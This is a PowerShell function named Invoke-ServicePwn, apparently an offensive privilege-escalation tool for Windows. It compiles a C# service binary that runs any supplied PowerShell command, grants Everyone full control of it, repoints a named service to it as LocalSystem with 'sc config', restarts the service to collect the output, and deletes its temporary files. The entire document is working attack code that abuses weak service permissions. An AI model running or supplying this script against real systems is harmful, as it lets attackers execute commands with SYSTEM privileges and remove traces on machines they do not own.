function Invoke-ServicePwn {

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command
    )

    $csf = New-TemporaryFile;
    $outf = "$(New-TemporaryFile).exe";
    $coutf = New-TemporaryFile;
    Set-Content -Path $csf -Value @"
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;

namespace WindowsService1
{
    public class Service1 : ServiceBase
    {

        public Service1()
        {
        }

        protected override void OnStart(string[] args)
        {
	    using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(@"$Command");
		string o = "";
                foreach (PSObject result in ps.Invoke()) {
		    o += result.ToString() + "\r\n";
                }
		File.WriteAllText(@"$coutf", o);
                rs.Close();
            }
        }

        protected override void OnStop()
        {
        }
    }
    static class Program
    {
	static void Main() {
	    ServiceBase.Run(new ServiceBase[] { new Service1() });
	}
    }
}
"@
    $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
    c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$outf $csf | Out-Null;
    cmd /c icacls $outf /grant everyone:F | Out-Null;
    Write-Host "service binary path: $outf";
    
    Set-Service -Name $Name -StartupType Manual;
    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$Name" -Name ImagePath -Value "$outf";
    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$Name" -Name ObjectName -Value "NT AUTHORITY\LocalSystem";
    cmd /c sc config $Name obj= "LocalSystem" binPath= "$outf" | Out-Null;
    Restart-Service -Name $Name;

    Start-Sleep -s 1;
    Write-Host "==============";
    Write-Host (Get-Content -Path $coutf);
    Write-Host "==============";

    Stop-Service -Name $Name;
    rm "$csf";
    rm "$outf";
    rm "$coutf";
    
}
